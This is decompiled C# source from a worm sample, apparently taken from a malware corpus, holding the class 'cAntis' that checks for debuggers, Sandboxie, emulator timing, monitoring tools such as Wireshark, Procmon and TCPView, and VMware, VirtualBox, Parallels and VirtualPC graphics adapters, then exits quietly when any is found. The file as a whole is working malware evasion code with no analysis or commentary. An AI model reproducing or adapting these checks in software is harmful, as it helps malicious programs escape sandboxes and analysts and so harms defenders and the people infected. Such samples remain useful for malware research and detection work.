// Decompiled with JetBrains decompiler
// Type: SysDriver.cAntis
// Assembly: SysDriver, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 591752E5-2C24-490A-AF88-A636AB72D7B7
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Worm.MSIL.Arcdoor.ae-9a70c0fa82dd869c7b769f53a0f2f245e58c379690ba2933aaf80f8e9c831958.exe

using System;
using System.Collections;
using System.Diagnostics;
using System.Threading;

namespace SysDriver
{
  internal class cAntis
  {
    public void checkAntis()
    {
      if (cMain.ConfigClass.bAntiDebugger)
      {
        try
        {
          if (Debugger.IsAttached)
          {
            this.Terminate();
            return;
          }
        }
        catch
        {
        }
      }
      if (cMain.ConfigClass.bAntiSandboxie)
      {
        try
        {
          foreach (string module in (ReadOnlyCollectionBase) Process.GetCurrentProcess().Modules)
          {
            if (module.Contains("sbiedll.dll"))
            {
              this.Terminate();
              return;
            }
          }
        }
        catch
        {
        }
      }
      if (cMain.ConfigClass.bAntiEmulator)
      {
        try
        {
          long ticks = DateTime.Now.Ticks;
          Thread.Sleep(10);
          if (DateTime.Now.Ticks - ticks < 10L)
          {
            this.Terminate();
            return;
          }
        }
        catch
        {
        }
      }
      if (cMain.ConfigClass.bAntiNetstat)
      {
        try
        {
          if (cMain.FunctionClass.checkProcess("NETSTAT"))
          {
            this.Terminate();
            return;
          }
        }
        catch
        {
        }
      }
      if (cMain.ConfigClass.bAntiFilemon)
      {
        try
        {
          if (cMain.FunctionClass.checkProcess("FILEMON"))
          {
            this.Terminate();
            return;
          }
        }
        catch
        {
        }
      }
      if (cMain.ConfigClass.bAntiProcessmon)
      {
        try
        {
          if (cMain.FunctionClass.checkProcess("PROCMON"))
          {
            this.Terminate();
            return;
          }
        }
        catch
        {
        }
      }
      if (cMain.ConfigClass.bAntiRegmon)
      {
        try
        {
          if (cMain.FunctionClass.checkProcess("REGMON"))
          {
            this.Terminate();
            return;
          }
        }
        catch
        {
        }
      }
      if (cMain.ConfigClass.bAntiCain)
      {
        try
        {
          if (cMain.FunctionClass.checkProcess("CAIN"))
          {
            this.Terminate();
            return;
          }
        }
        catch
        {
        }
      }
      if (cMain.ConfigClass.bAntiNetworkmon)
      {
        try
        {
          if (cMain.FunctionClass.checkProcess("NETMON"))
          {
            this.Terminate();
            return;
          }
        }
        catch
        {
        }
      }
      if (cMain.ConfigClass.bAntiTCPView)
      {
        try
        {
          if (cMain.FunctionClass.checkProcess("TCPVIEW"))
          {
            this.Terminate();
            return;
          }
        }
        catch
        {
        }
      }
      if (cMain.ConfigClass.bAntiWireshark)
      {
        try
        {
          if (cMain.FunctionClass.checkProcess("WIRESHARK"))
          {
            this.Terminate();
            return;
          }
        }
        catch
        {
        }
      }
      if (cMain.ConfigClass.bAntiParallelsDesktop)
      {
        try
        {
          if (cMain.SystemInfoClass.getGraphicDevice() == "Parallels Video Adapter")
          {
            this.Terminate();
            return;
          }
        }
        catch
        {
        }
      }
      if (cMain.ConfigClass.bAntiVMWare)
      {
        try
        {
          if (cMain.SystemInfoClass.getGraphicDevice() == "VMware SVGA II")
          {
            this.Terminate();
            return;
          }
        }
        catch
        {
        }
      }
      if (cMain.ConfigClass.bAntiVirtualBox)
      {
        try
        {
          if (cMain.SystemInfoClass.getGraphicDevice() == "VirtualBox Graphics Adapter")
          {
            this.Terminate();
            return;
          }
        }
        catch
        {
        }
      }
      if (!cMain.ConfigClass.bAntiVirtualPC)
        return;
      try
      {
        string[] strArray = new string[2]
        {
          "VM Additions S3 Trio32/64",
          "S3 Trio32/64"
        };
        foreach (string str in strArray)
        {
          if (cMain.SystemInfoClass.getGraphicDevice() == str)
          {
            this.Terminate();
            break;
          }
        }
      }
      catch
      {
      }
    }

    private void Terminate() => Environment.Exit(0);
  }
}
